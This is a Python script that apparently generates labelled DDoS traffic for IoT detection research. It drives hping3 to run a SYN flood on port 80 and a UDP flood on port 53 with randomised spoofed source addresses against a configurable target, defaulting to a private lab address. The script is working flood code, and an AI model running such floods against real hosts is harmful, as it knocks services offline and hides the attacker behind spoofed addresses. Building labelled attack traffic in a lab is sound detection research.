"""Traffic attack generator using hping3 for Raspberry Pi DDoS simulation.

Supports standard SYN Flood and UDP Flood attack simulation cycles with
automatic timestamp logging to reports/labels_map.txt.
"""

import argparse
import os
import subprocess
import sys
import time


def run_scenario(name: str, label: int, hping_args: list[str] | None, duration: int, target_ip: str, log_file: str) -> None:
    timestamp = time.time()
    os.makedirs(os.path.dirname(log_file) or ".", exist_ok=True)
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"{timestamp},{label},{name}\n")

    print(f"\n[!] {time.strftime('%H:%M:%S')} - Starting {name} against {target_ip} (duration: {duration}s)...")

    if hping_args:
        cmd = ["sudo", "hping3"] + hping_args + [target_ip]
        print(f"    Running: {' '.join(cmd)}")
        try:
            proc = subprocess.Popen(cmd)
            time.sleep(duration)
            print(f"[#] Stopping {name}...")
            subprocess.run(["sudo", "killall", "-9", "hping3"], stderr=subprocess.DEVNULL)
            proc.terminate()
        except FileNotFoundError:
            print("[WARN] hping3 not installed. On Debian/Ubuntu/Kali run: sudo apt-get install -y hping3")
            time.sleep(duration)
    else:
        # Silence / normal period
        print(f"    Normal traffic period (no flood packets sent for {duration}s)...")
        time.sleep(duration)


def main() -> None:
    parser = argparse.ArgumentParser(description="Simulate DDoS flood attacks against target IoT / Pi device")
    parser.add_argument("--target", default="192.168.137.211", help="Target device IP (e.g., Raspberry Pi IP)")
    parser.add_argument("--log", default="reports/labels_map.txt", help="Path to save event timestamps")
    parser.add_argument("--duration", type=int, default=20, help="Duration in seconds for each attack phase")
    parser.add_argument("--silence", type=int, default=10, help="Duration in seconds for the normal/silence phase")
    args = parser.parse_args()

    print("=" * 60)
    print(f" IoT DDoS Attack Generator (hping3)")
    print(f" Target IP:         {args.target}")
    print(f" Attack Duration:   {args.duration}s each")
    print(f" Silence Duration:  {args.silence}s")
    print(f" Event Log:         {args.log}")
    print("=" * 60)

    try:
        # Phase 1: Standard SYN Flood
        run_scenario(
            name="Standard SYN Flood",
            label=1,
            hping_args=["-S", "-p", "80", "-c", "5000", "-i", "u2000", "--rand-source"],
            duration=args.duration,
            target_ip=args.target,
            log_file=args.log,
        )

        # Phase 2: Silence / Normal
        run_scenario(
            name="Normal/Silence",
            label=0,
            hping_args=None,
            duration=args.silence,
            target_ip=args.target,
            log_file=args.log,
        )

        # Phase 3: Standard UDP Flood
        run_scenario(
            name="Standard UDP Flood",
            label=1,
            hping_args=["-2", "-p", "53", "-c", "5000", "-i", "u2000", "--rand-source"],
            duration=args.duration,
            target_ip=args.target,
            log_file=args.log,
        )

    except KeyboardInterrupt:
        print("\nSimulation aborted by user. Cleaning up...")
        subprocess.run(["sudo", "killall", "-9", "hping3"], stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"\nError occurred: {e}")
        subprocess.run(["sudo", "killall", "-9", "hping3"], stderr=subprocess.DEVNULL)

    print("\n[✔] Attack Cycle Complete.")


if __name__ == "__main__":
    main()